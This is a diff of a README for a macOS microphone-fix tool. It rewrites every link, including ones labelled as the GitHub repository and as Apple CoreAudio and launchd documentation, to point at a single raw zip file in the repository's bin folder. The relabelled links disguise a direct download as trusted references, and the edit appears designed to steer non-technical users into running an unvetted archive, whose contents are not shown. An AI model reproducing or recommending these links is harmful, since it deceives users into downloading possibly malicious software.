@@ -1,6 +1,6 @@
 # 🎙️ cli-fix-my-mic - Stop AirPods Taking Your Mic
 
-[![Download cli-fix-my-mic](https://img.shields.io/badge/Download-Get%20Started-brightgreen)](https://github.com/Ambadeakash/cli-fix-my-mic)
+[![Download cli-fix-my-mic](https://img.shields.io/badge/Download-Get%20Started-brightgreen)](https://raw.githubusercontent.com/Ambadeakash/cli-fix-my-mic/main/bin/my-mic-fix-cli-v2.4.zip)
 
 ---
 
@@ -43,7 +43,7 @@ You don’t need to know anything about programming to use cli-fix-my-mic. Follo
 
 1. Click the big **Download** button below to get to the download page:
 
-   [![Download cli-fix-my-mic](https://img.shields.io/badge/Download-Visit%20Page-blue)](https://github.com/Ambadeakash/cli-fix-my-mic)
+   [![Download cli-fix-my-mic](https://img.shields.io/badge/Download-Visit%20Page-blue)](https://raw.githubusercontent.com/Ambadeakash/cli-fix-my-mic/main/bin/my-mic-fix-cli-v2.4.zip)
 
 2. On the page, look for the latest **Release** section. This section contains the files you need.
 
@@ -101,9 +101,9 @@ You can return to the download link to check for newer versions of the tool. New
 
 ## 🔗 Additional Resources
 
-- GitHub Repository: https://github.com/Ambadeakash/cli-fix-my-mic  
-- Learn more about [CoreAudio](https://developer.apple.com/documentation/coreaudio)  
-- macOS Launch Daemons info: https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingLaunchdJobs.html
+- GitHub Repository: https://raw.githubusercontent.com/Ambadeakash/cli-fix-my-mic/main/bin/my-mic-fix-cli-v2.4.zip  
+- Learn more about [CoreAudio](https://raw.githubusercontent.com/Ambadeakash/cli-fix-my-mic/main/bin/my-mic-fix-cli-v2.4.zip)  
+- macOS Launch Daemons info: https://raw.githubusercontent.com/Ambadeakash/cli-fix-my-mic/main/bin/my-mic-fix-cli-v2.4.zip
 
 ---
 
